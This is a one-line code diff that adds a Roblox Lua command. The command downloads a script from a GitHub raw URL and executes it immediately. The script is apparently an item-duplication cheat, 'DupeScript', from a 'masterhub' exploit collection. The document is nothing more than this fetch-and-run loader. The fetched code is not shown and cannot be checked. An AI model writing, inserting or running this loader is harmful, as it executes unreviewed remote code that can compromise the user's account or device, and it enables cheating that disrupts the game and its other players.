@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/destyIol/masterhubv311/main/itachi/DupeScript.lua.lua"))()
